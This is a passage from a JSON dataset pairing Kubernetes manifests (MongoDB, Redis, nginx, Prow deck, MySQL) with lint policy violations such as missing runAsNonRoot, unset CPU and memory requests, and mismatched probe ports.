    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-gce-pd-storage\n  labels:\n    app: reddit\n    component: mongo\n    comment-db: 'true'\n    post-db: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: mongo\n  template:\n    metadata:\n      name: mongo\n      labels:\n        app: reddit\n        component: mongo\n        comment-db: 'true'\n        post-db: 'true'\n    spec:\n      containers:\n      - image: mongo:3.2\n        name: mongo\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "11176",
    "manifest_path": "data/manifests/the_stack_sample/sample_4301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-gce-pd-storage\n  labels:\n    app: reddit\n    component: mongo\n    comment-db: 'true'\n    post-db: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: mongo\n  template:\n    metadata:\n      name: mongo\n      labels:\n        app: reddit\n        component: mongo\n        comment-db: 'true'\n        post-db: 'true'\n    spec:\n      containers:\n      - image: mongo:3.2\n        name: mongo\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "11177",
    "manifest_path": "data/manifests/the_stack_sample/sample_4301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-gce-pd-storage\n  labels:\n    app: reddit\n    component: mongo\n    comment-db: 'true'\n    post-db: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: mongo\n  template:\n    metadata:\n      name: mongo\n      labels:\n        app: reddit\n        component: mongo\n        comment-db: 'true'\n        post-db: 'true'\n    spec:\n      containers:\n      - image: mongo:3.2\n        name: mongo\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "11178",
    "manifest_path": "data/manifests/the_stack_sample/sample_4302.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    role: master\n    tier: backend\nspec:\n  ports:\n  - port: 6379\n    targetPort: 6379\n  selector:\n    app: redis\n    role: master\n    tier: backend\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis role:master tier:backend])"
  },
  {
    "id": "11179",
    "manifest_path": "data/manifests/the_stack_sample/sample_4303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: example-local-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"task-pv-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11180",
    "manifest_path": "data/manifests/the_stack_sample/sample_4303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: example-local-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"task-pv-container\" does not have a read-only root file system"
  },
  {
    "id": "11181",
    "manifest_path": "data/manifests/the_stack_sample/sample_4303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: example-local-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"task-pv-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11182",
    "manifest_path": "data/manifests/the_stack_sample/sample_4303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: example-local-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"task-pv-container\" has cpu request 0"
  },
  {
    "id": "11183",
    "manifest_path": "data/manifests/the_stack_sample/sample_4303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: example-local-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"task-pv-container\" has memory limit 0"
  },
  {
    "id": "11184",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11185",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11186",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "11187",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"deck\" not found"
  },
  {
    "id": "11188",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11189",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "11190",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "11191",
    "manifest_path": "data/manifests/the_stack_sample/sample_4304.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20211220-180c042a80\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "11192",
    "manifest_path": "data/manifests/the_stack_sample/sample_4306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-volumeclaim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "11193",
    "manifest_path": "data/manifests/the_stack_sample/sample_4306.yaml",
